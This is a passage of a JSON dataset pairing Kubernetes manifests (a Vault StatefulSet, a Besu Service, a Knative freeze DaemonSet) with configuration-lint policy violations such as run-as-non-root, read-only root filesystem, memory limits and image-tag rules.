valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_project\n        - name: KMS_REGION\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_region\n        - name: KMS_KEY_RING\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_key_ring\n        - name: KMS_CRYPTO_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_crypto_key\n        - name: LOAD_BALANCER_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: load_balancer_address\n        - name: POD_IP_ADDR\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: VAULT_LOCAL_CONFIG\n          value: \"api_addr     = \\\"https://$(LOAD_BALANCER_ADDR)\\\"\\ncluster_addr =\\\n            \\ \\\"https://$(POD_IP_ADDR):8201\\\"\\n\\nlog_level = \\\"warn\\\"\\n\\nui = true\\n\\\n            \\nseal \\\"gcpckms\\\" {\\n  project    = \\\"$(KMS_PROJECT)\\\"\\n  region    \\\n            \\ = \\\"$(KMS_REGION)\\\"\\n  key_ring   = \\\"$(KMS_KEY_RING)\\\"\\n  crypto_key\\\n            \\ = \\\"$(KMS_CRYPTO_KEY)\\\"\\n}\\n\\nstorage \\\"gcs\\\" {\\n  bucket     = \\\"$(GCS_BUCKET_NAME)\\\"\\\n            \\n  ha_enabled = \\\"true\\\"\\n}\\n\\nlistener \\\"tcp\\\" {\\n  address     = \\\"\\\n            127.0.0.1:8200\\\"\\n  tls_disable = \\\"true\\\"\\n}\\n\\nlistener \\\"tcp\\\" {\\n\\\n            \\  address       = \\\"$(POD_IP_ADDR):8200\\\"\\n  tls_cert_file = \\\"/etc/vault/tls/vault.crt\\\"\\\n            \\n  tls_key_file  = \\\"/etc/vault/tls/vault.key\\\"\\n\\n  tls_disable_client_certs\\\n            \\ = true\\n}\\n\"\n        readinessProbe:\n          httpGet:\n            path: /v1/sys/health?standbyok=true\n            port: 8200\n            scheme: HTTPS\n          initialDelaySeconds: 5\n          periodSeconds: 5\n      volumes:\n      - name: vault-tls\n        secret:\n          secretName: vault-tls\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable VAULT_SECRET_THRESHOLD in container \"vault-init\" found"
  },
  {
    "id": "7821",
    "manifest_path": "data/manifests/the_stack_sample/sample_2883.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: vault\n  labels:\n    app: vault\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vault\n  template:\n    metadata:\n      labels:\n        app: vault\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 60\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - vault\n              topologyKey: kubernetes.io/hostname\n      containers:\n      - name: vault-init\n        image: registry.hub.docker.com/sethvargo/vault-init:1.0.0\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        env:\n        - name: CHECK_INTERVAL\n          value: '5'\n        - name: GCS_BUCKET_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: gcs_bucket_name\n        - name: KMS_KEY_ID\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_key_id\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: VAULT_SECRET_SHARES\n          value: '1'\n        - name: VAULT_SECRET_THRESHOLD\n          value: '1'\n      - name: vault\n        image: registry.hub.docker.com/library/vault:1.2.2\n        imagePullPolicy: IfNotPresent\n        args:\n        - server\n        securityContext:\n          capabilities:\n            add:\n            - IPC_LOCK\n        ports:\n        - containerPort: 8200\n          name: vault-port\n          protocol: TCP\n        - containerPort: 8201\n          name: cluster-port\n          protocol: TCP\n        resources:\n          requests:\n            cpu: 500m\n            memory: 256Mi\n        volumeMounts:\n        - name: vault-tls\n          mountPath: /etc/vault/tls\n        env:\n        - name: GCS_BUCKET_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: gcs_bucket_name\n        - name: KMS_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_project\n        - name: KMS_REGION\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_region\n        - name: KMS_KEY_RING\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_key_ring\n        - name: KMS_CRYPTO_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_crypto_key\n        - name: LOAD_BALANCER_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: load_balancer_address\n        - name: POD_IP_ADDR\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: VAULT_LOCAL_CONFIG\n          value: \"api_addr     = \\\"https://$(LOAD_BALANCER_ADDR)\\\"\\ncluster_addr =\\\n            \\ \\\"https://$(POD_IP_ADDR):8201\\\"\\n\\nlog_level = \\\"warn\\\"\\n\\nui = true\\n\\\n            \\nseal \\\"gcpckms\\\" {\\n  project    = \\\"$(KMS_PROJECT)\\\"\\n  region    \\\n            \\ = \\\"$(KMS_REGION)\\\"\\n  key_ring   = \\\"$(KMS_KEY_RING)\\\"\\n  crypto_key\\\n            \\ = \\\"$(KMS_CRYPTO_KEY)\\\"\\n}\\n\\nstorage \\\"gcs\\\" {\\n  bucket     = \\\"$(GCS_BUCKET_NAME)\\\"\\\n            \\n  ha_enabled = \\\"true\\\"\\n}\\n\\nlistener \\\"tcp\\\" {\\n  address     = \\\"\\\n            127.0.0.1:8200\\\"\\n  tls_disable = \\\"true\\\"\\n}\\n\\nlistener \\\"tcp\\\" {\\n\\\n            \\  address       = \\\"$(POD_IP_ADDR):8200\\\"\\n  tls_cert_file = \\\"/etc/vault/tls/vault.crt\\\"\\\n            \\n  tls_key_file  = \\\"/etc/vault/tls/vault.key\\\"\\n\\n  tls_disable_client_certs\\\n            \\ = true\\n}\\n\"\n        readinessProbe:\n          httpGet:\n            path: /v1/sys/health?standbyok=true\n            port: 8200\n            scheme: HTTPS\n          initialDelaySeconds: 5\n          periodSeconds: 5\n      volumes:\n      - name: vault-tls\n        secret:\n          secretName: vault-tls\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"vault\" does not have a read-only root file system"
  },
  {
    "id": "7822",
    "manifest_path": "data/manifests/the_stack_sample/sample_2883.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: vault\n  labels:\n    app: vault\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vault\n  template:\n    metadata:\n      labels:\n        app: vault\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 60\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - vault\n              topologyKey: kubernetes.io/hostname\n      containers:\n      - name: vault-init\n        image: registry.hub.docker.com/sethvargo/vault-init:1.0.0\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        env:\n        - name: CHECK_INTERVAL\n          value: '5'\n        - name: GCS_BUCKET_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: gcs_bucket_name\n        - name: KMS_KEY_ID\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_key_id\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: VAULT_SECRET_SHARES\n          value: '1'\n        - name: VAULT_SECRET_THRESHOLD\n          value: '1'\n      - name: vault\n        image: registry.hub.docker.com/library/vault:1.2.2\n        imagePullPolicy: IfNotPresent\n        args:\n        - server\n        securityContext:\n          capabilities:\n            add:\n            - IPC_LOCK\n        ports:\n        - containerPort: 8200\n          name: vault-port\n          protocol: TCP\n        - containerPort: 8201\n          name: cluster-port\n          protocol: TCP\n        resources:\n          requests:\n            cpu: 500m\n            memory: 256Mi\n        volumeMounts:\n        - name: vault-tls\n          mountPath: /etc/vault/tls\n        env:\n        - name: GCS_BUCKET_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: gcs_bucket_name\n        - name: KMS_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_project\n        - name: KMS_REGION\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_region\n        - name: KMS_KEY_RING\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_key_ring\n        - name: KMS_CRYPTO_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_crypto_key\n        - name: LOAD_BALANCER_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: load_balancer_address\n        - name: POD_IP_ADDR\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: VAULT_LOCAL_CONFIG\n          value: \"api_addr     = \\\"https://$(LOAD_BALANCER_ADDR)\\\"\\ncluster_addr =\\\n            \\ \\\"https://$(POD_IP_ADDR):8201\\\"\\n\\nlog_level = \\\"warn\\\"\\n\\nui = true\\n\\\n            \\nseal \\\"gcpckms\\\" {\\n  project    = \\\"$(KMS_PROJECT)\\\"\\n  region    \\\n            \\ = \\\"$(KMS_REGION)\\\"\\n  key_ring   = \\\"$(KMS_KEY_RING)\\\"\\n  crypto_key\\\n            \\ = \\\"$(KMS_CRYPTO_KEY)\\\"\\n}\\n\\nstorage \\\"gcs\\\" {\\n  bucket     = \\\"$(GCS_BUCKET_NAME)\\\"\\\n            \\n  ha_enabled = \\\"true\\\"\\n}\\n\\nlistener \\\"tcp\\\" {\\n  address     = \\\"\\\n            127.0.0.1:8200\\\"\\n  tls_disable = \\\"true\\\"\\n}\\n\\nlistener \\\"tcp\\\" {\\n\\\n            \\  address       = \\\"$(POD_IP_ADDR):8200\\\"\\n  tls_cert_file = \\\"/etc/vault/tls/vault.crt\\\"\\\n            \\n  tls_key_file  = \\\"/etc/vault/tls/vault.key\\\"\\n\\n  tls_disable_client_certs\\\n            \\ = true\\n}\\n\"\n        readinessProbe:\n          httpGet:\n            path: /v1/sys/health?standbyok=true\n            port: 8200\n            scheme: HTTPS\n          initialDelaySeconds: 5\n          periodSeconds: 5\n      volumes:\n      - name: vault-tls\n        secret:\n          secretName: vault-tls\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"vault-init\" does not have a read-only root file system"
  },
  {
    "id": "7823",
    "manifest_path": "data/manifests/the_stack_sample/sample_2883.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: vault\n  labels:\n    app: vault\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vault\n  template:\n    metadata:\n      labels:\n        app: vault\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 60\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - vault\n              topologyKey: kubernetes.io/hostname\n      containers:\n      - name: vault-init\n        image: registry.hub.docker.com/sethvargo/vault-init:1.0.0\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        env:\n        - name: CHECK_INTERVAL\n          value: '5'\n        - name: GCS_BUCKET_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: gcs_bucket_name\n        - name: KMS_KEY_ID\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_key_id\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: VAULT_SECRET_SHARES\n          value: '1'\n        - name: VAULT_SECRET_THRESHOLD\n          value: '1'\n      - name: vault\n        image: registry.hub.docker.com/library/vault:1.2.2\n        imagePullPolicy: IfNotPresent\n        args:\n        - server\n        securityContext:\n          capabilities:\n            add:\n            - IPC_LOCK\n        ports:\n        - containerPort: 8200\n          name: vault-port\n          protocol: TCP\n        - containerPort: 8201\n          name: cluster-port\n          protocol: TCP\n        resources:\n          requests:\n            cpu: 500m\n            memory: 256Mi\n        volumeMounts:\n        - name: vault-tls\n          mountPath: /etc/vault/tls\n        env:\n        - name: GCS_BUCKET_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: gcs_bucket_name\n        - name: KMS_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_project\n        - name: KMS_REGION\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_region\n        - name: KMS_KEY_RING\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_key_ring\n        - name: KMS_CRYPTO_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_crypto_key\n        - name: LOAD_BALANCER_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: load_balancer_address\n        - name: POD_IP_ADDR\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: VAULT_LOCAL_CONFIG\n          value: \"api_addr     = \\\"https://$(LOAD_BALANCER_ADDR)\\\"\\ncluster_addr =\\\n            \\ \\\"https://$(POD_IP_ADDR):8201\\\"\\n\\nlog_level = \\\"warn\\\"\\n\\nui = true\\n\\\n            \\nseal \\\"gcpckms\\\" {\\n  project    = \\\"$(KMS_PROJECT)\\\"\\n  region    \\\n            \\ = \\\"$(KMS_REGION)\\\"\\n  key_ring   = \\\"$(KMS_KEY_RING)\\\"\\n  crypto_key\\\n            \\ = \\\"$(KMS_CRYPTO_KEY)\\\"\\n}\\n\\nstorage \\\"gcs\\\" {\\n  bucket     = \\\"$(GCS_BUCKET_NAME)\\\"\\\n            \\n  ha_enabled = \\\"true\\\"\\n}\\n\\nlistener \\\"tcp\\\" {\\n  address     = \\\"\\\n            127.0.0.1:8200\\\"\\n  tls_disable = \\\"true\\\"\\n}\\n\\nlistener \\\"tcp\\\" {\\n\\\n            \\  address       = \\\"$(POD_IP_ADDR):8200\\\"\\n  tls_cert_file = \\\"/etc/vault/tls/vault.crt\\\"\\\n            \\n  tls_key_file  = \\\"/etc/vault/tls/vault.key\\\"\\n\\n  tls_disable_client_certs\\\n            \\ = true\\n}\\n\"\n        readinessProbe:\n          httpGet:\n            path: /v1/sys/health?standbyok=true\n            port: 8200\n            scheme: HTTPS\n          initialDelaySeconds: 5\n          periodSeconds: 5\n      volumes:\n      - name: vault-tls\n        secret:\n          secretName: vault-tls\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"vault\" is not set to runAsNonRoot"
  },
  {
    "id": "7824",
    "manifest_path": "data/manifests/the_stack_sample/sample_2883.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: vault\n  labels:\n    app: vault\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vault\n  template:\n    metadata:\n      labels:\n        app: vault\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 60\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - vault\n              topologyKey: kubernetes.io/hostname\n      containers:\n      - name: vault-init\n        image: registry.hub.docker.com/sethvargo/vault-init:1.0.0\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        env:\n        - name: CHECK_INTERVAL\n          value: '5'\n        - name: GCS_BUCKET_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: gcs_bucket_name\n        - name: KMS_KEY_ID\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_key_id\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: VAULT_SECRET_SHARES\n          value: '1'\n        - name: VAULT_SECRET_THRESHOLD\n          value: '1'\n      - name: vault\n        image: registry.hub.docker.com/library/vault:1.2.2\n        imagePullPolicy: IfNotPresent\n        args:\n        - server\n        securityContext:\n          capabilities:\n            add:\n            - IPC_LOCK\n        ports:\n        - containerPort: 8200\n          name: vault-port\n          protocol: TCP\n        - containerPort: 8201\n          name: cluster-port\n          protocol: TCP\n        resources:\n          requests:\n            cpu: 500m\n            memory: 256Mi\n        volumeMounts:\n        - name: vault-tls\n          mountPath: /etc/vault/tls\n        env:\n        - name: GCS_BUCKET_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: gcs_bucket_name\n        - name: KMS_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_project\n        - name: KMS_REGION\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_region\n        - name: KMS_KEY_RING\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_key_ring\n        - name: KMS_CRYPTO_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_crypto_key\n        - name: LOAD_BALANCER_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: load_balancer_address\n        - name: POD_IP_ADDR\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: VAULT_LOCAL_CONFIG\n          value: \"api_addr     = \\\"https://$(LOAD_BALANCER_ADDR)\\\"\\ncluster_addr =\\\n            \\ \\\"https://$(POD_IP_ADDR):8201\\\"\\n\\nlog_level = \\\"warn\\\"\\n\\nui = true\\n\\\n            \\nseal \\\"gcpckms\\\" {\\n  project    = \\\"$(KMS_PROJECT)\\\"\\n  region    \\\n            \\ = \\\"$(KMS_REGION)\\\"\\n  key_ring   = \\\"$(KMS_KEY_RING)\\\"\\n  crypto_key\\\n            \\ = \\\"$(KMS_CRYPTO_KEY)\\\"\\n}\\n\\nstorage \\\"gcs\\\" {\\n  bucket     = \\\"$(GCS_BUCKET_NAME)\\\"\\\n            \\n  ha_enabled = \\\"true\\\"\\n}\\n\\nlistener \\\"tcp\\\" {\\n  address     = \\\"\\\n            127.0.0.1:8200\\\"\\n  tls_disable = \\\"true\\\"\\n}\\n\\nlistener \\\"tcp\\\" {\\n\\\n            \\  address       = \\\"$(POD_IP_ADDR):8200\\\"\\n  tls_cert_file = \\\"/etc/vault/tls/vault.crt\\\"\\\n            \\n  tls_key_file  = \\\"/etc/vault/tls/vault.key\\\"\\n\\n  tls_disable_client_certs\\\n            \\ = true\\n}\\n\"\n        readinessProbe:\n          httpGet:\n            path: /v1/sys/health?standbyok=true\n            port: 8200\n            scheme: HTTPS\n          initialDelaySeconds: 5\n          periodSeconds: 5\n      volumes:\n      - name: vault-tls\n        secret:\n          secretName: vault-tls\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"vault-init\" is not set to runAsNonRoot"
  },
  {
    "id": "7825",
    "manifest_path": "data/manifests/the_stack_sample/sample_2883.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: vault\n  labels:\n    app: vault\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vault\n  template:\n    metadata:\n      labels:\n        app: vault\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 60\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - vault\n              topologyKey: kubernetes.io/hostname\n      containers:\n      - name: vault-init\n        image: registry.hub.docker.com/sethvargo/vault-init:1.0.0\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        env:\n        - name: CHECK_INTERVAL\n          value: '5'\n        - name: GCS_BUCKET_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: gcs_bucket_name\n        - name: KMS_KEY_ID\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_key_id\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: VAULT_SECRET_SHARES\n          value: '1'\n        - name: VAULT_SECRET_THRESHOLD\n          value: '1'\n      - name: vault\n        image: registry.hub.docker.com/library/vault:1.2.2\n        imagePullPolicy: IfNotPresent\n        args:\n        - server\n        securityContext:\n          capabilities:\n            add:\n            - IPC_LOCK\n        ports:\n        - containerPort: 8200\n          name: vault-port\n          protocol: TCP\n        - containerPort: 8201\n          name: cluster-port\n          protocol: TCP\n        resources:\n          requests:\n            cpu: 500m\n            memory: 256Mi\n        volumeMounts:\n        - name: vault-tls\n          mountPath: /etc/vault/tls\n        env:\n        - name: GCS_BUCKET_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: gcs_bucket_name\n        - name: KMS_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_project\n        - name: KMS_REGION\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_region\n        - name: KMS_KEY_RING\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_key_ring\n        - name: KMS_CRYPTO_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_crypto_key\n        - name: LOAD_BALANCER_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: load_balancer_address\n        - name: POD_IP_ADDR\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: VAULT_LOCAL_CONFIG\n          value: \"api_addr     = \\\"https://$(LOAD_BALANCER_ADDR)\\\"\\ncluster_addr =\\\n            \\ \\\"https://$(POD_IP_ADDR):8201\\\"\\n\\nlog_level = \\\"warn\\\"\\n\\nui = true\\n\\\n            \\nseal \\\"gcpckms\\\" {\\n  project    = \\\"$(KMS_PROJECT)\\\"\\n  region    \\\n            \\ = \\\"$(KMS_REGION)\\\"\\n  key_ring   = \\\"$(KMS_KEY_RING)\\\"\\n  crypto_key\\\n            \\ = \\\"$(KMS_CRYPTO_KEY)\\\"\\n}\\n\\nstorage \\\"gcs\\\" {\\n  bucket     = \\\"$(GCS_BUCKET_NAME)\\\"\\\n            \\n  ha_enabled = \\\"true\\\"\\n}\\n\\nlistener \\\"tcp\\\" {\\n  address     = \\\"\\\n            127.0.0.1:8200\\\"\\n  tls_disable = \\\"true\\\"\\n}\\n\\nlistener \\\"tcp\\\" {\\n\\\n            \\  address       = \\\"$(POD_IP_ADDR):8200\\\"\\n  tls_cert_file = \\\"/etc/vault/tls/vault.crt\\\"\\\n            \\n  tls_key_file  = \\\"/etc/vault/tls/vault.key\\\"\\n\\n  tls_disable_client_certs\\\n            \\ = true\\n}\\n\"\n        readinessProbe:\n          httpGet:\n            path: /v1/sys/health?standbyok=true\n            port: 8200\n            scheme: HTTPS\n          initialDelaySeconds: 5\n          periodSeconds: 5\n      volumes:\n      - name: vault-tls\n        secret:\n          secretName: vault-tls\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"vault\" has memory limit 0"
  },
  {
    "id": "7826",
    "manifest_path": "data/manifests/the_stack_sample/sample_2883.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: vault\n  labels:\n    app: vault\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vault\n  template:\n    metadata:\n      labels:\n        app: vault\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 60\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - vault\n              topologyKey: kubernetes.io/hostname\n      containers:\n      - name: vault-init\n        image: registry.hub.docker.com/sethvargo/vault-init:1.0.0\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        env:\n        - name: CHECK_INTERVAL\n          value: '5'\n        - name: GCS_BUCKET_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: gcs_bucket_name\n        - name: KMS_KEY_ID\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_key_id\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: VAULT_SECRET_SHARES\n          value: '1'\n        - name: VAULT_SECRET_THRESHOLD\n          value: '1'\n      - name: vault\n        image: registry.hub.docker.com/library/vault:1.2.2\n        imagePullPolicy: IfNotPresent\n        args:\n        - server\n        securityContext:\n          capabilities:\n            add:\n            - IPC_LOCK\n        ports:\n        - containerPort: 8200\n          name: vault-port\n          protocol: TCP\n        - containerPort: 8201\n          name: cluster-port\n          protocol: TCP\n        resources:\n          requests:\n            cpu: 500m\n            memory: 256Mi\n        volumeMounts:\n        - name: vault-tls\n          mountPath: /etc/vault/tls\n        env:\n        - name: GCS_BUCKET_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: gcs_bucket_name\n        - name: KMS_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_project\n        - name: KMS_REGION\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_region\n        - name: KMS_KEY_RING\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_key_ring\n        - name: KMS_CRYPTO_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_crypto_key\n        - name: LOAD_BALANCER_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: load_balancer_address\n        - name: POD_IP_ADDR\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: VAULT_LOCAL_CONFIG\n          value: \"api_addr     = \\\"https://$(LOAD_BALANCER_ADDR)\\\"\\ncluster_addr =\\\n            \\ \\\"https://$(POD_IP_ADDR):8201\\\"\\n\\nlog_level = \\\"warn\\\"\\n\\nui = true\\n\\\n            \\nseal \\\"gcpckms\\\" {\\n  project    = \\\"$(KMS_PROJECT)\\\"\\n  region    \\\n            \\ = \\\"$(KMS_REGION)\\\"\\n  key_ring   = \\\"$(KMS_KEY_RING)\\\"\\n  crypto_key\\\n            \\ = \\\"$(KMS_CRYPTO_KEY)\\\"\\n}\\n\\nstorage \\\"gcs\\\" {\\n  bucket     = \\\"$(GCS_BUCKET_NAME)\\\"\\\n            \\n  ha_enabled = \\\"true\\\"\\n}\\n\\nlistener \\\"tcp\\\" {\\n  address     = \\\"\\\n            127.0.0.1:8200\\\"\\n  tls_disable = \\\"true\\\"\\n}\\n\\nlistener \\\"tcp\\\" {\\n\\\n            \\  address       = \\\"$(POD_IP_ADDR):8200\\\"\\n  tls_cert_file = \\\"/etc/vault/tls/vault.crt\\\"\\\n            \\n  tls_key_file  = \\\"/etc/vault/tls/vault.key\\\"\\n\\n  tls_disable_client_certs\\\n            \\ = true\\n}\\n\"\n        readinessProbe:\n          httpGet:\n            path: /v1/sys/health?standbyok=true\n            port: 8200\n            scheme: HTTPS\n          initialDelaySeconds: 5\n          periodSeconds: 5\n      volumes:\n      - name: vault-tls\n        secret:\n          secretName: vault-tls\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"vault-init\" has memory limit 0"
  },
  {
    "id": "7827",
    "manifest_path": "data/manifests/the_stack_sample/sample_2884.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: besu-validator4\n  labels:\n    app: validator4\nspec:\n  type: ClusterIP\n  selector:\n    app: validator4\n  ports:\n  - port: 30303\n    targetPort: 30303\n    protocol: UDP\n    name: dev-p2p-udp\n  - port: 30303\n    targetPort: 30303\n    protocol: TCP\n    name: dev-p2p-tcp\n  - port: 8545\n    targetPort: 8545\n    protocol: TCP\n    name: http\n  - port: 8546\n    targetPort: 8546\n    protocol: TCP\n    name: ws\n  - port: 8547\n    targetPort: 8547\n    protocol: TCP\n    name: graphql\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:validator4])"
  },
  {
    "id": "7828",
    "manifest_path": "data/manifests/the_stack_sample/sample_2885.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: freeze-daemon-containerd\n  namespace: knative-serving\nspec:\n  selector:\n    matchLabels:\n      name: freeze-daemon\n  template:\n    metadata:\n      labels:\n        name: freeze-daemon\n    spec:\n      serviceAccountName: freeze-tokenreview\n      containers:\n      - name: daemon\n        securityContext:\n          runAsUser: 0\n        image: ko://knative.dev/container-freezer/cmd/daemon\n        env:\n        - name: RUNTIME_TYPE\n          valueFrom:\n            configMapKeyRef:\n              name: freeze-configmap\n              key: runtime-type\n        - name: FREEZER_LOGGING_CONFIG\n          valueFrom:\n            configMapKeyRef:\n              name: freeze-configmap\n              key: freezer-logging-config\n        - name: FREEZER_LOGGING_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              name: freeze-configmap\n              key: freezer-logging-level\n        ports:\n        - containerPort: 8080\n          hostPort: 9696\n        volumeMounts:\n        - name: containerd-socket\n          mountPath: /var/run/containerd/containerd.sock\n      volumes:\n      - name: containerd-socket\n        hostPath:\n          path: /var/run/containerd/containerd.sock\n          type: Socket\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"daemon\" is using an invalid container image, \"ko://knative.dev/container-freezer/cmd/daemon\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7829",
    "manifest_path": "data/manifests/the_stack_sample/sample_2885.yaml",
